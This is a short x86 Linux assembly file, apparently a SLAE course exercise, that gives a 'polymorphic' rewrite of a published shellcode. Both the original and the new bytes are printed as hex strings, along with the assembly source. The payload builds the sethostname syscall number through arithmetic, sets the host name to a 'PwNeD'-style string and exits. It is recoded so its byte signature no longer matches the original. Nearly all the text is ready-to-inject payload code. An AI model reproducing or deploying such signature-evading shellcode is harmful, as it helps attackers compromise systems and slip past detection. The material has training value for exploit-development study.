;Description:	Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-622.php
;Original Shellcode (32 bytes):	\xeb\x11\x31\xc0\xb0\x4a\x5b\xb1\x08\xcd\x80\x31\xc0xb0\x01\x31\xdb\xcd\x80\xe8\xea\xff\xff\xff\x50\x77\x4e\x65\x44\x20\x21\x21
;Polymorphic Shellcode (27 bytes):	\xb0\x15\x04\x35\xba\x44\x21\x4e\x45\xc1\xc2\x10\x52\x66\x68\x50\x57\x89\xe3\xb1\x06\xcd\x80\xb0\x01\xcd\x80
;Author:	Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:	526

global _start
section .text
_start:
	mov al,0x15
	add al,0x35
	mov edx,0x454e2144
	rol edx,16
	push edx
	push WORD 0x5750
	mov ebx,esp
	mov cl,6
	int 0x80
	mov al,1
	int 0x80
